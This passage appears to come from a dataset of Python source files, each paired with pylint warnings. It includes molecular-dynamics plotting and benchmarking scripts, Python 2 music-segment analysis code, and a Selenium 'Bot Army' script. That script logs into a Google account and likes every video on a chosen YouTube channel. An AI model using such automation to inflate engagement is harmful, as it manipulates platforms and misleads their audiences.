74                         vmin=0.2*np.round(np.min(np.min(performances))*5),
75                         cmap=cmap, annot=False
76                         )
77   
78   
79       cax = plt.gcf().axes[-1]
80       pos_old = cax.get_position()
81       pos_new = [pos_old.x0 - 0.01, pos_old.y0 + 0,  pos_old.width, pos_old.height*((len(rhos)-1)*1./len(rhos))]
82       cax.set_position(pos_new)
83       cax.tick_params(labelleft=False, labelright=True)
84       cax.set_yticklabels(['Low', '', '', '', 'High'])
85   
86       ax.text(len(N)+0.35, len(rhos), 'Performance\n[flops/cycle]', ha='left', va='top')
87   
88   
89       rho_labels_short = ['%.2f' % a for a in rhos]
90       ax.set_yticklabels(rho_labels_short)
91       
92       N_labels_short = ['10$^{%1.2f}$' % a for a in np.array(np.log10(N))]
93       ax.set_xticklabels(N_labels_short)
94   
95       ax.set_xlabel('Number of particles $N$')
96       ax.set_ylabel('Particle density',
97                       rotation=0, horizontalalignment = 'left')
98       ax.yaxis.set_label_coords(0., 1.01)
99       plt.yticks(rotation=0)
100   
101       filename = 'forces-grid.pdf'
102       print(""saving '%s'"" % filename )
103       plt.savefig(filename)
104   
105   
106   if __name__ == '__main__':
107       perf, N, rhos = measure_performance()
108       plot_performance(perf, N, rhos)
","33 - warning: unnecessary-semicolon
66 - warning: unnecessary-semicolon
16 - warning: wildcard-import
35 - warning: redefined-outer-name
37 - warning: redefined-outer-name
56 - warning: redefined-outer-name
42 - refactor: no-else-return
53 - error: undefined-variable
64 - warning: redefined-outer-name
64 - warning: redefined-outer-name
"
"1   #!usr/bin/env python3
2   #                   _
3   #   _ __ ___   ___ | | ___  ___
4   #  | '_ ` _ \ / _ \| |/ _ \/ __|
5   #  | | | | | | (_) | |  __/ (__
6   #  |_| |_| |_|\___/|_|\___|\___| - Molecular Dynamics Framework
7   #
8   #  Copyright (C) 2016  Carlo Del Don  (deldonc@student.ethz.ch)
9   #                      Michel Breyer  (mbreyer@student.ethz.ch)
10   #                      Florian Frei   (flofrei@student.ethz.ch)
11   #                      Fabian Thuring (thfabian@student.ethz.ch)
12   #
13   #  This file is distributed under the MIT Open Source License.
14   #  See LICENSE.txt for details.
15   
16   import numpy as np
17   import matplotlib.pyplot as plt
18   import seaborn as sns
19   import sys
20   import json
21   
22   # seaborn formatting
23   sns.set_context(""notebook"", font_scale=1.1)
24   sns.set_style(""darkgrid"")
25   sns.set_palette('deep')
26   deep = [""#4C72B0"", ""#55A868"", ""#C44E52"", ""#8172B2"", ""#CCB974"", ""#64B5CD""]
27   
28   try:
29       filename = sys.argv[1]
30   except IndexError as ie:
31       print('usage: plot results.txt')
32       sys.exit(1)
33   
34   # load results from json object
35   with open(filename, 'r') as infile:
36       results = json.load(infile)
37   
38   N   = np.array(results['N'])
39   rho = np.array(results['rho'])
40   
41   del results['N']
42   del results['rho']
43   
44   #----- plot runtime ------
45   
46   fig = plt.figure()
47   ax = fig.add_subplot(1,1,1);
48   
49   for k in sorted(results):
50       if 'cell_ref' in results:
51           ax.semilogx(N, np.array(results['cell_ref']) / np.array(results[k]), 'o-', label=k)
52       elif 'lf' in results:
53           ax.semilogx(N, np.array(results['lf']) / np.array(results[k]), 'o-', label=k)
54   
55   
56   ax.set_xlabel('Number of particles $N$')
57   ax.set_ylabel('Runtime Speedup',
58                 rotation=0,
59                 horizontalalignment = 'left')
60   ax.yaxis.set_label_coords(-0.055, 1.05)
61   
62   ax.set_xlim([np.min(N)*0.9, np.max(N)*1.1])
63   ax.set_ylim([0.0, 1.2 * ax.get_ylim()[1]])
64   
65   ax.legend(loc='upper right')
66   
67   plt.savefig(filename[:filename.rfind('.')]+'-runtime.pdf')
68   
69   #----- plot performance -----
70   
71   flops = dict()
72   flops['cell_ref'] = lambda N, rho : 301 * N * rho * 2.5**3
73   flops['q']        = lambda N, rho : 301 * N * rho * 2.5**3
74   flops['q_g']      = lambda N, rho : 180 * N * rho * 2.5**3
75   flops['q_g_avx']  = lambda N, rho : N * (205 * rho * 2.5**3 + 24)
76   flops['lf']     = lambda N, rho : 9 * N
77   flops['lf2']    = lambda N, rho : 9 * N
78   flops['lf4']    = lambda N, rho : 9 * N
79   flops['lf8']    = lambda N, rho : 9 * N
80   flops['lf_avx'] = lambda N, rho : 9 * N
81   
82   fig = plt.figure()
83   ax = fig.add_subplot(1,1,1);
84   
85   for k in sorted(results):
86       ax.semilogx(N, flops[k](N,rho) / np.array(results[k]), 'o-', label=k)
87   
88   ax.set_xlabel('Number of particles $N$')
89   ax.set_ylabel('Performance [Flops/Cycles]',
90                 rotation=0,
91                 horizontalalignment = 'left')
92   ax.yaxis.set_label_coords(-0.055, 1.05)
93   
94   ax.set_xlim([np.min(N)*0.9, np.max(N)*1.1])
95   ax.set_ylim([-0.1, 1.4 * ax.get_ylim()[1]])
96   
97   ax.legend(loc='upper right')
98   
99   plt.savefig(filename[:filename.rfind('.')]+'-performance.pdf')
","47 - warning: unnecessary-semicolon
83 - warning: unnecessary-semicolon
35 - warning: unspecified-encoding
71 - refactor: use-dict-literal
"
"1   #!usr/bin/env python3
2   #                   _
3   #   _ __ ___   ___ | | ___  ___
4   #  | '_ ` _ \ / _ \| |/ _ \/ __|
5   #  | | | | | | (_) | |  __/ (__
6   #  |_| |_| |_|\___/|_|\___|\___| - Molecular Dynamics Framework
7   #
8   #  Copyright (C) 2016  Carlo Del Don  (deldonc@student.ethz.ch)
9   #                      Michel Breyer  (mbreyer@student.ethz.ch)
10   #                      Florian Frei   (flofrei@student.ethz.ch)
11   #                      Fabian Thuring (thfabian@student.ethz.ch)
12   #
13   #  This file is distributed under the MIT Open Source License.
14   #  See LICENSE.txt for details.
15   
16   from pymolec import *
17   
18   import numpy as np
19   import json
20   import sys
21   
22   #------------------------------------------------------------------------------
23   
24   integrators = ['lf', 'lf2', 'lf4', 'lf8', 'lf_avx']
25   
26   N = np.logspace(2, 5, 12, base=10).astype(np.int32)
27   steps = np.array([25])
28   
29   rho = 1.0
30   rc  = 2.5
31   
32   #------------------------------------------------------------------------------
33   
34   filename = sys.argv[1]
35   
36   results = {}
37   
38   for integrator in integrators:
39       p = pymolec(N=N, rho=rho, steps=steps, force='q_g_avx', integrator=integrator)
40       output = p.run()
41   
42       results['N'] = output['N'].tolist()
43       results['rho'] = output['rho'].tolist()
44       results[integrator] = output['integrator'].tolist()
45   
46   print('Saving performance data to ' + filename)
47   
48   with open(filename, 'w') as outfile:
49       json.dump(results, outfile, indent=4)
","16 - warning: wildcard-import
39 - error: undefined-variable
48 - warning: unspecified-encoding
"
"1   #!usr/bin/env python3
2   #                   _
3   #   _ __ ___   ___ | | ___  ___
4   #  | '_ ` _ \ / _ \| |/ _ \/ __|
5   #  | | | | | | (_) | |  __/ (__
6   #  |_| |_| |_|\___/|_|\___|\___| - Molecular Dynamics Framework
7   #
8   #  Copyright (C) 2016  Carlo Del Don  (deldonc@student.ethz.ch)
9   #                      Michel Breyer  (mbreyer@student.ethz.ch)
10   #                      Florian Frei   (flofrei@student.ethz.ch)
11   #                      Fabian Thuring (thfabian@student.ethz.ch)
12   #
13   #  This file is distributed under the MIT Open Source License.
14   #  See LICENSE.txt for details.
15   
16   import numpy as np
17   import time, sys, os, subprocess
18   
19   class pymolec:
20   
21       def __init__(self, N=np.array([1000]), rho=1.25, steps=np.array([100]),
22                    force=""cell_ref"", integrator=""lf"", periodic=""ref""):
23   
24           self.N = N
25           self.rho = rho
26   
27   
28           if hasattr(steps, ""__len__""):
29               if len(N) != len(steps):
30                   self.steps = np.full(len(N), steps[0], dtype=np.int)
31               else:
32                   self.steps = steps
33           else:
34               self.steps = np.full(len(N), steps, dtype=np.int)
35   
36   
37           self.force = force
38           self.integrator = integrator
39           self.periodic = periodic
40   
41       def run(self, path = None):
42           """"""
43           runs a molec simulation for the given configurations and outputs a
44           dictionnary containing N, rho, force, integrator, periodic, simulation
45           """"""
46   
47           # Use default path
48           if not path:
49               script_path = os.path.join(os.path.dirname(os.path.abspath(__file__)))
50               if os.name == 'nt':
51                   path = os.path.join(script_path, '..', 'build', 'molec.exe')
52               else:
53                   path = os.path.join(script_path, '..', 'build', 'molec')
54   
55           # Check if molec exists
56           if not os.path.exists(path):
57               raise IOError(""no such file or directory: %s"" % path)
58   
59           times = np.zeros((4, len(self.N)))
60   
61           print (""Running molec: %s"" % path)
62           print (""rho = {0}, force = {1}, integrator = {2}, periodic = {3}"".format(
63               self.rho, self.force, self.integrator, self.periodic))
64   
65   
66           output = {}
67   
68           output['N'] = np.zeros(len(self.N))
69           output['rho'] = np.zeros(len(self.N))
70           output['force'] = np.zeros(len(self.N))
71           output['integrator'] = np.zeros(len(self.N))
72           output['periodic'] = np.zeros(len(self.N))
73           output['simulation'] = np.zeros(len(self.N))
74   
75           for i in range(len(self.N)):
76               cmd = [path]
77               cmd += [""--N="" + str(self.N[i])]
78               cmd += [""--rho="" + str(self.rho)]
79               cmd += [""--step="" + str(self.steps[i])]
80               cmd += [""--force="" + self.force]
81               cmd += [""--integrator="" + self.integrator]
82               cmd += [""--periodic="" + self.periodic]
83               cmd += [""--verbose=0""]
84   
85               # Print status
86               start = time.time()
87               print("" - N = %9i ..."" % self.N[i], end='')
88               sys.stdout.flush()
89   
90               try:
91                   out = subprocess.check_output(cmd).decode(encoding='utf-8').split('\t')
92   
93                   print("" %20f s"" % (time.time() - start))
94   
95                   output['N'][i] = int(out[0])
96                   output['rho'][i] = float(out[1])
97                   output['force'][i] = int(out[3])
98                   output['integrator'][i] = int(out[5])
99                   output['periodic'][i] = int(out[7])
100                   output['simulation'][i] = int(out[9])
101   
102               except subprocess.CalledProcessError as e:
103                   print(e.output)
104   
105           return output
106   
107   def main():
108       p = pymolec()
109       print(p.run())
110   
111   if __name__ == '__main__':
112       main()
","21 - refactor: too-many-arguments
21 - refactor: too-many-positional-arguments
59 - warning: unused-variable
19 - refactor: too-few-public-methods
"
"1   from selenium import webdriver
2   from selenium.common.exceptions import *
3   from selenium.webdriver.common.by import By
4   from selenium.webdriver.support.ui import WebDriverWait
5   from selenium.webdriver.support import expected_conditions as EC
6   from time import sleep
7   from getpass import getpass
8   import tkinter as tk
9   from tkinter import messagebox
10   
11   class tanmay_bhat:
12       def __init__(self, username, password, channel_addr):
13   
14           try:
15               #Check for Chrome webdriver in Windows
16               self.bot = webdriver.Chrome('driver/chromedriver.exe')
17           except WebDriverException:
18               try: 
19                   #Check for Chrome webdriver in Linux
20                   self.bot = webdriver.Chrome('/usr/bin/chromedriver') 
21               except WebDriverException:
22                   print(""Please set Chrome Webdriver path above"")
23                   exit()
24   
25           self.username = username
26           self.password = password
27           self.channel_addr = channel_addr
28   
29       def login(self):
30           bot = self.bot
31           print(""\nStarting Login process!\n"")
32           bot.get('https://stackoverflow.com/users/signup?ssrc=head&returnurl=%2fusers%2fstory%2fcurrent%27')
33           bot.implicitly_wait(10)
34           self.bot.find_element_by_xpath('//*[@id=""openid-buttons""]/button[1]').click()
35           self.bot.find_element_by_xpath('//input[@type=""email""]').send_keys(self.username)
36           self.bot.find_element_by_xpath('//*[@id=""identifierNext""]').click()
37           sleep(3)
38           self.bot.find_element_by_xpath('//input[@type=""password""]').send_keys(self.password)
39           self.bot.find_element_by_xpath('//*[@id=""passwordNext""]').click()
40           WebDriverWait(self.bot, 900).until(EC.presence_of_element_located((By.XPATH, ""/html/body/header/div/div[1]/a[2]/span"")))
41           print(""\nLoggedin Successfully!\n"")
42           sleep(2)
43           self.bot.get(self.channel_addr + ""/videos"")
44   
45       def start_liking(self):
46           bot = self.bot
47           scroll_pause = 2
48           last_height = bot.execute_script(""return document.documentElement.scrollHeight"")
49           while True:
50               bot.execute_script(""window.scrollTo(0, document.documentElement.scrollHeight);"")
51               sleep(scroll_pause)
52   
53               new_height = bot.execute_script(""return document.documentElement.scrollHeight"")
54               if new_height == last_height:
55                   print(""\nScrolling Finished!\n"")
56                   break
57               last_height = new_height
58               print(""\nScrolling"")
59   
60           all_vids = bot.find_elements_by_id('thumbnail')
61           links = [elm.get_attribute('href') for elm in all_vids]
62           links.pop()
63           for i in range(len(links)):
64               bot.get(links[i])
65   
66               like_btn = bot.find_element_by_xpath('//*[@id=""top-level-buttons""]/ytd-toggle-button-renderer[1]/a')
67               check_liked = bot.find_element_by_xpath('//*[@id=""top-level-buttons""]/ytd-toggle-button-renderer[1]')
68               # Check if its already liked
69               if check_liked.get_attribute(""class"") == 'style-scope ytd-menu-renderer force-icon-button style-text':
70                   like_btn.click()
71                   print(""Liked video! Bot Army Zindabad!!!\n"")
72                   sleep(0.5)
73               elif check_liked.get_attribute(""class"") == 'style-scope ytd-menu-renderer force-icon-button style-default-active':
74                   print(""Video already liked. You are a good Bot Army Member\n"")
75   
76   
77   
78   
79   #**************************************************     GUI AREA     **********************************************
80   
81   def start():
82       if email_entry.get() and  password_entry.get() and url_entry.get():
83           bot_army = tanmay_bhat(email_entry.get(), password_entry.get(), url_entry.get())
84           root.destroy()
85           bot_army.login()
86           bot_army.start_liking()
87       else:
88           messagebox.showinfo('Notice', 'Please fill all the entries to proceed furthur')
89   
90   def tanmay_url_inject():
91       url_entry.delete(0, tk.END)
92       url_entry.insert(0, ""https://www.youtube.com/c/TanmayBhatYouTube"")
93   
94   root = tk.Tk()           
95   root.resizable(False, False)
96   root.geometry('%dx%d+%d+%d' % (760, 330, (root.winfo_screenwidth()/2) - (760/2), (root.winfo_screenheight()/2) - (330/2)))
97   
98   frame = tk.Frame(root, height=330, width=760)
99   head_label = tk.Label(frame, text='Youtube Video Liker', font=('verdana', 25))
100   email_label = tk.Label(frame, text='Email: ', font=('verdana', 15))
101   password_label = tk.Label(frame, text='Password: ', font=('verdana', 15))
102   email_entry = tk.Entry(frame, font=('verdana', 15))
103   password_entry = tk.Entry(frame, font=('verdana', 15), show=""*"")
104   url_label = tk.Label(frame, text='Channel\nURL', font=('verdana', 15))
105   url_entry = tk.Entry(frame, font=('verdana', 15))
106   tanmay_button = tk.Button(frame, text='Tanmay\nBhatt', font=('verdana', 15), command=tanmay_url_inject)
107   start_button = tk.Button(frame, text='Start Liking', font=('verdana', 20), command=start)
108   
109   frame.pack()
110   head_label.place(y=15, relx=0.32)
111   email_label.place(x=15, y=95, anchor='w')
112   password_label.place(x=15, y=130, anchor='w')
113   email_entry.place(x=140, y=78, width=600)
114   password_entry.place(x=140, y=115, width=600)
115   url_label.place(x=15, y=190, anchor='w')
116   url_entry.place(x=140, y=175, width=600)
117   tanmay_button.place(x=400, y=240)
118   start_button.place(x=550, y=250)
119   root.mainloop()
120   
121   
122   """"""
123   Comment out the GUI area and uncomment the Console Area to use Console controls
124   **********************************************   Console Area    *******************************************
125   
126   print(""HI BOT ARMYYYYYYY! How you doing?\nToday is the time to make our PROVIDER (BOT LEADER) proud by liking all his videos!\n\nLet's make hime proud!!\n\n"")
127   
128   print(""Enter the link of the channel or just hit [ENTER] key for default Tanmay's Channel"")
129   channel_addr = str(input(""Channel Link: ""))
130   
131   username = str(input(""\nEnter your YouTube/Google Email ID: ""))
132   password = str(getpass(""Enter your password: ""))
133   
134   if not channel_addr:
135       channel_addr = ""https://www.youtube.com/c/TanmayBhatYouTube""
136   
137   
138   bot_army = tanmay_bhat(username, password, channel_addr)
139   bot_army.login()
140   bot_army.start_liking()
141   print(""\n\nALL VIDEOS ARE LIKED!!! YOU CAN NOW OFFICIALLY CALL YOURSELF:\nA PROUD BOT ARMY MEMBERRRRR!!!!!!\n\n\nPress any key to end"")
142   input()
143   """"""","2 - warning: wildcard-import
17 - error: undefined-variable
21 - error: undefined-variable
23 - refactor: consider-using-sys-exit
122 - warning: pointless-string-statement
7 - warning: unused-import
"
"1   """"""
2   Self_compare_dist.py
3   
4   Usage: This program has a function called self_seg_compare().
5   This function takes a track id (named as a parameter in the function),
6   compares every segment to every other segment, and
7   prints out the following information:
8   
9       1. The number of segments that have one or more matches
10       2. The number of possible combinations that match
11       3. Saves a histogram that describes the combinations
12       4. Returns the adjacency list for the segments in the song
13   
14   Takes the segments of a song, compares them using the Infinite Jukebox's
15   fields and weights, and gives a percentage of segments that have another
16   segment within 45 of itself.  It also saves a histogram of these
17   distances.  The histogram only shows distances <= 800, and up to 600
18   matches in each bin.
19   
20   This program uses the weights and ideas on how to compare
21   segments.  The following is a link to access the Infinite Jukebox:
22   http://labs.echonest.com/Uploader/index.html
23   
24   Author: Chris Smith
25   
26   Date: 03.11.2015
27   
28   """"""
29   
30   import matplotlib
31   matplotlib.use(""Agg"")
32   import echonest.remix.audio as audio
33   import matplotlib.pyplot as plt
34   import scipy.spatial.distance as distance
35   import numpy as np
36   
37   '''
38   Method that uses a track id to compare every segment with
39   every other segment, supplies a histogram that shows
40   the distances between segments (tuples of segments),
41   and returns an adjacency list of segments in the song.
42   '''
43   def self_seg_compare():
44       #Defines the threshold for comparisons
45       thres = 45
46       adj_list = []
47       sim_seg_count = 0
48       sim_count = 0
49       track_id = ""TRAWRYX14B7663BAE0""
50       audiofile = audio.AudioAnalysis(track_id)
51       segments = audiofile.segments
52       #Get each segment's array of comparison data
53       segs = np.array(segments.pitches)
54       segs = np.c_[segs, np.array(segments.timbre)]
55       segs = np.c_[segs, np.array(segments.loudness_max)]
56       segs = np.c_[segs, np.array(segments.loudness_begin)]
57       segs = np.c_[segs, np.ones(len(segs))]
58       #Finish creating the adjacency list
59       for i in segments:
60           adj_list.append([])
61       #Finish getting the comparison data
62       for i in range(len(segs)):
63           segs[i][26] = segments[i].duration
64       #Get the euclidean distance for the pitch vectors, then multiply by 10
65       distances = distance.cdist(segs[:,:12], segs[:,:12], 'euclidean')
66       for i in range(len(distances)):
67           for j in range(len(distances)):
68               distances[i][j] = 10 * distances[i][j]
69       #Get the euclidean distance for the timbre vectors, adding it to the
70       #pitch distance
71       distances = distances + distance.cdist(segs[:,12:24], segs[:,12:24], 'euclidean')
72       #Get the rest of the distance calculations, adding them to the previous
73       #calculations.
74       for i in range(len(distances)):
75           for j in range(len(distances)):
76               distances[i][j] = distances[i][j] + abs(segs[i][24] - segs[j][24])
77               distances[i][j] = distances[i][j] + abs(segs[i][25] - segs[j][25]) + abs(segs[i][26] - segs[j][26]) * 100
78       i_point = 0
79       j_point = 0
80       #Use i_point and j_point for the indices in the 2D distances array
81       for i_point in range(len(distances)):
82           for j_point in range(len(distances)):
83               if i_point != j_point:
84                   #Check to see if the distance between segment # i_point and
85                   #segment # j_point is less than 45
86                   if abs(distances[i_point][j_point]) <= thres:
87                       #Add to the adjacency lists if not already there
88                       if j_point not in adj_list[i_point]:
89                           adj_list[i_point].append(j_point)
90                       if i_point not in adj_list[j_point]:
91                           adj_list[j_point].append(i_point)
92               j_point = j_point + 1
93           i_point = i_point + 1
94           j_point = 0
95       #Get the count of the similarities in the adjacency lists
96       for i in adj_list:
97           if len(i) > 0:
98               sim_count = sim_count + len(i);
99               sim_seg_count = sim_seg_count + 1
100               #print i, ""\n""
101       print ""Num of segments with at least 1 match: "", sim_seg_count, "" out of"", len(segments)
102       print ""Percentage of segments with at least 1 match: "", (sim_seg_count / float(len(segments)) * 100), ""%""
103       print ""Num of similar tuples: "", sim_count, "" out of "", len(segments) ** 2 - len(segments)
104       print ""Percentage of possible tuples that are similar: "", sim_count / float(len(segments) ** 2 - len(segments)) * 100, ""%""
105       print ""Note:This takes out comparisons between a segment and itself.""
106       #Get the number of bins.  Calculated by taking the max range and dividing by 50
107       bins = int(np.amax(distances)) / thres
108       #Make the histogram with titles and axis labels.  Plot the line x=thres for visual comparison.
109       plt.hist(distances.ravel(), bins = bins)
110       plt.title('Distances between Tuples of Segments')
111       plt.xlabel('Distances')
112       plt.ylabel('Number of occurrences')
113       plt.axvline(thres, color = 'r', linestyle = 'dashed')
114       #Make each tick on the x-axis correspond to the end of a bin.
115       plt.xticks(range(0, int(np.amax(distances) + 2 * thres), thres))
116       #Make each tick on the y-axis correspond to each 25000th number up to the number of possible tuple combos / 2.
117       plt.yticks(range(0, (len(segments) ** 2 - len(segments))/2 + 25000, 25000))
118       plt.gcf().savefig('sim_histogram.png')
119       return adj_list
120   
","101 - error: syntax-error
"
"1   import numpy as np
2   from collections import Counter
3   
4   def calculate(filename):
5       data = np.load(filename)
6       checked = data[1]
7       countClusters = Counter()
8       counter = Counter()
9       for i in checked:
10           countClusters[i] += 1
11       for i in countClusters.values():
12           counter[i] += 1
13       val = counter.values()
14       key = counter.keys()
15       sum = 0
16       for i in range(len(key)):
17           sum += val[i] * key[i] ** 2
18       sum += (len(checked) * len(countClusters.values()))
19       print sum
20       fin = sum * (4376.4/4999950000)
21       print fin
","19 - error: syntax-error
"
"1   """"""
2   h5_seg_to_array.py
3   
4   Usage: In the functions following this, the parameters are described as follows:
5   
6   dir: the directory to search
7   
8   filename: the filename for saving/loading the results to/from
9   
10   Program that parses all .h5 files in the passed in directory and subdirectories,
11   getting the segment arrays from each .h5 file and putting them into a 
12   numpy array for later use.  Each segment array is in the following format:
13   
14   [12 values for segment pitch, 12 values for segment timbre, 1 value for loudness
15   max, 1 value for loudness start, and 1 value for the segment duration]
16   
17   This program uses the hdf5_getters, which can be found here:
18   https://github.com/tbertinmahieux/MSongsDB/blob/master/PythonSrc/hdf5_getters.py
19   
20   Author: Chris Smith
21   
22   Date: 02.22.2015
23   """"""
24   import os
25   import numpy as np
26   import hdf5_getters as getters
27   
28   '''
29   Method that takes a directory, searches that directory, as well as any 
30   subdirectories, and returns a list of every .h5 file.
31   '''
32   def get_h5_files(dir):
33       list = []
34       for root, dirs, files in os.walk(dir):
35           for file in files:
36               name, extension = os.path.splitext(file)
37               if extension == "".h5"":
38                   list.append(os.path.realpath(os.path.join(root, file)))
39           for subdir in dirs:
40               get_h5_files(subdir)
41       return list
42   
43   '''
44   Method that takes a directory, gets every .h5 file in that directory (plus any
45   subdirectories), and then parses those files.  The outcome is a Numpy array
46   that contains every segment in each file. Each row in the array of arrays
47   contains pitch, timbre, loudness max, loudness start, and the duration of each
48   segment.
49   ''' 
50   def h5_files_to_np_array(dir, filename):
51       list = get_h5_files(dir)
52       num_done = 0
53       seg_array = []
54       #Go through every file and get the desired information.
55       for file in list:
56           song = getters.open_h5_file_read(file)
57           seg_append = np.array(getters.get_segments_pitches(song))
58           seg_append = np.c_[ seg_append, np.array(getters.get_segments_timbre(song))]
59           seg_append = np.c_[seg_append, np.array(getters.get_segments_loudness_max(song))]
60           seg_append = np.c_[seg_append, np.array(getters.get_segments_loudness_start(song))]
61           start = np.array(getters.get_segments_start(song))
62           for i in range(0,len(start)-1):    
63               if i != (len(start) - 1):
64                   start[i] = start[i+1] - start[i]
65           start[len(start) - 1] = getters.get_duration(song) - start[len(start) - 1]
66           seg_append = np.c_[seg_append, start]
67           #Add the arrays to the bottom of the list
68           seg_array.extend(seg_append.tolist())
69           song.close()
70           num_done = num_done + 1
71           #Gives a count for every 500 files completed
72           if num_done % 500 == 0:
73               print num_done,"" of "",len(list)
74       #Convert the list to a Numpy array
75       seg_array = np.array(seg_array)
76       #Save the array in a file
77       seg_array.dump(filename)
78       print len(seg_array),"" number of segments in the set.""
79       return seg_array
80       
81   '''
82   Method that opens the file with that filename.  The file must contain a 
83   Numpy array.  This method returns the array.
84   '''
85   def open(filename):
86       data = np.load(filename)
87       return data
","73 - error: syntax-error
"
"1   import numpy as np
2   
3   def check(filename):
4       clusters = np.load(filename)
5       clusters = clusters[1]
6       truths = np.load(""Results/groundtruths.npy"")
7       error = 0
8       total = 0
9       for i in range(len(truths)):
10           for j in range(len(truths[i])):
11               if clusters[truths[i][j]] != clusters[i]:
12                   error += 1
13               total += 1
14       print error
15       print total
","14 - error: syntax-error
"
"1   #!/usr/bin/env python
2   # encoding: utf=8
3   """"""
4   one.py
5   
6   Digest only the first beat of every bar.
7   
8   By Ben Lacker, 2009-02-18.
9   
10   """"""
11   
12   '''
13   one_segment.py
14   
15   Author: Chris Smith, 02-05-2015
16   
17   Changes made to original one.py:
18   
19       - Changes made to take the first segment out of every beat.
20       - Does not take the first beat from every bar anymore.
21   
22   The original code is stored at this address: https://github.com/echonest/remix/blob/master/examples/one/one.py
23   '''
24   import echonest.remix.audio as audio
25   
26   usage = """"""
27   Usage: 
28       python one.py <input_filename> <output_filename>
29   
30   Example:
31       python one.py EverythingIsOnTheOne.mp3 EverythingIsReallyOnTheOne.mp3
32   """"""
33   
34   def main(input_filename, output_filename):
35       audiofile = audio.LocalAudioFile(input_filename)
36       '''
37       This line got the bars of the song in the previous version:
38       bars = audiofile.analysis.bars
39       
40       Now, this line gets the beats in the song:
41       '''
42       beats = audiofile.analysis.beats
43       collect = audio.AudioQuantumList()
44       '''
45       This loop got the first beat in each bar and appended them to a list:
46       for bar in bars:
47           collect.append(bar.children()[0])
48           
49       Now, this loop gets the first segment in each beat and appends them to the list:
50       '''
51       for b in beats:
52           collect.append(b.children()[0])
53       out = audio.getpieces(audiofile, collect)
54       out.encode(output_filename)
55   
56   if __name__ == '__main__':
57       import sys
58       try:
59           input_filename = sys.argv[1]
60           output_filename = sys.argv[2]
61       except:
62           print usage
63           sys.exit(-1)
64       main(input_filename, output_filename)
","62 - error: syntax-error
"
"1   import matplotlib
2   matplotlib.use(""Agg"")
3   import numpy as np
4   import matplotlib.pyplot as plt
5   import time
6   from collections import Counter
7   
8   def truth_generator(filename):
9       data = np.load(filename)
10       data.resize(100000, 27)
11       truths = []
12       for i in range(len(data)):
13           truths.append([])
14       t0 = time.time()
15       for i in range(0,100000,10000):
16           a = data[i:i+10000,]
17           a[:,:12:] *= 10
18           a[:,26] *= 100
19           for j in range(i,100000,10000):
20               b = data[j:j+10000,]
21               b[:,:12:] *= 10
22               b[:,26] *= 100
23               c = seg_distances(a,b)
24               for k in range(len(c)):
25                   for l in range(len(c)):
26                       if c[k,l] <= 80:
27                           truths[k+i].append(l+j)
28               print ""Done. Onto the next one...""
29       print time.time() - t0
30       np.save(""Results/groundtruths"", truths)
31   
32   def histo_generator(filename):
33       data = np.load(filename)
34       labels = data[1]
35       counter = Counter()
36       for i in labels:
37           counter[i] += 1
38       if np.amax(len(counter)) / 50 >= 5:
39           bins = np.amax(len(counter)) / 50
40       else:
41           bins = 5
42       plt.hist(counter.values(), bins = bins)
43       plt.title('Number of members per cluster')
44       plt.xlabel('Number of members')
45       plt.ylabel('Number of occurrences')
46       ticks = range(0, bins)
47       #plt.xticks(ticks[0::50])
48       plt.gcf().savefig('Results/truthCountHistogram.png')
49       plt.close()
50   
51   def seg_distances(u_, v_=None):
52       from scipy.spatial.distance import pdist, cdist, squareform
53       from numpy import diag, ones
54       if v_ is None:
55           d_ = pdist(u_[:, 0:12], 'euclidean')
56           d_ += pdist(u_[:, 12:24], 'euclidean')
57           d_ += pdist(u_[:, 24:], 'cityblock')
58           d_ = squareform(d_) + diag(float('NaN') * ones((u_.shape[0],)))
59       else:
60           d_ = cdist(u_[:, 0:12], v_[:, 0:12], 'euclidean')
61           d_ += cdist(u_[:, 12:24], v_[:, 12:24], 'euclidean')
62           d_ += cdist(u_[:, 24:], v_[:, 24:], 'cityblock')
63   
64       return d_
","28 - error: syntax-error
"
"1   """"""
2   dir_comp.py
3   
4   Usage: In the functions following this, the parameters are described as follows:
5   
6   dir: the directory to search
7   
8   Program that parses all .mp3 files in the passed in directory,
9   gets the segment arrays from each .mp3 file and puts them into a
10   numpy array for later use.  Each segment array is in the following format:
11   
12   [12 values for segment pitch, 12 values for segment timbre, 1 value for loudness
13   max, 1 value for loudness start, and 1 value for the segment duration]
14   
15   Author: Chris Smith
16   
17   Date: 03.27.2015
18   """"""
19   import matplotlib
20   matplotlib.use(""Agg"")
21   import echonest.remix.audio as audio
22   import matplotlib.pyplot as plt
23   import scipy.spatial.distance as distance
24   import os
25   import numpy as np
26   
27   '''
28   Method that takes a directory, searches that directory, and returns a list of every .mp3 file in it.
29   '''
30   def get_mp3_files(dir):
31       list = []
32       for root, dirs, files in os.walk(dir):
33           for file in files:
34               name, extension = os.path.splitext(file)
35               if extension == "".mp3"":
36                   list.append(os.path.realpath(os.path.join(root, file)))
37       return list
38   
39   '''
40   Method that takes two .mp3 files and compares every segment within song A to 
41   every segment in song B and supplies a histogram that shows
42   the distances between segments (tuples of segments).  Also supplies some data
43   about the songs that were parsed.
44   '''
45   def two_song_comp(fileA, fileB):
46       #Defines the threshold for comparisons
47       thres = 45
48       nameA = os.path.basename(os.path.splitext(fileA)[0])
49       nameB = os.path.basename(os.path.splitext(fileB)[0])
50       adj_listA = []
51       adj_listB = []
52       sim_seg_countA = 0
53       sim_seg_countB = 0
54       sim_countA = 0
55       sim_countB = 0
56       audiofileA = audio.AudioAnalysis(fileA)
57       audiofileB = audio.AudioAnalysis(fileB)
58       segmentsA = audiofileA.segments
59       segmentsB = audiofileB.segments
60       #Get each segment's array of comparison data for song A
61       segsA = np.array(segmentsA.pitches)
62       segsA = np.c_[segsA, np.array(segmentsA.timbre)]
63       segsA = np.c_[segsA, np.array(segmentsA.loudness_max)]
64       segsA = np.c_[segsA, np.array(segmentsA.loudness_begin)]
65       segsA = np.c_[segsA, np.ones(len(segsA))]
66       #Get each segment's array of comparison data for song B
67       segsB = np.array(segmentsB.pitches)
68       segsB = np.c_[segsB, np.array(segmentsB.timbre)]
69       segsB = np.c_[segsB, np.array(segmentsB.loudness_max)]
70       segsB = np.c_[segsB, np.array(segmentsB.loudness_begin)]
71       segsB = np.c_[segsB, np.ones(len(segsB))]
72   
73       #Finish creating the adjacency list
74       for i in segmentsA:
75           adj_listA.append([])
76       for i in segmentsB:
77           adj_listB.append([])
78       #Finish getting the comparison data
79       for i in range(len(segsA)):
80           segsA[i][26] = segmentsA[i].duration
81       for i in range(len(segsB)):
82           segsB[i][26] = segmentsB[i].duration
83       #Get the euclidean distance for the pitch vectors, then multiply by 10
